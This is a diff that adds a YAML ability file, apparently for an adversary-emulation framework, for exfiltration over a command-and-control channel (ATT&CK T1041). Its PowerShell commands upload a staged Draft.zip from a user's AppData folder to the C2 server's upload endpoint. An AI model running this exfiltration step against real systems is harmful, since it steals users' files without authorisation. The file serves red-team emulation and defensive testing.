@@ -1,0 +1,51 @@
+ability_id: 68e209dd-f354-4adc-8bc6-e85a3e55a7f4
+access: {}
+additional_info: {}
+buckets:
+- exfiltration
+delete_payload: true
+description: Copy a target file from a remote file share through the existing C2 channel
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\upload.ps1 -Verbose -Force;
+
+    Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"
+    -Uri "#{server}/file/upload";'
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - upload.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: 'Import-Module .\upload.ps1 -Verbose -Force;
+
+    Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\AppData\Roaming\Draft.zip"
+    -Uri "#{server}/file/upload";'
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - upload.ps1
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Data from staged fileand Exfiltration over C2 Channel
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: exfiltration
+technique_id: T1041
+technique_name: Exfiltration Over Command and Control Channel
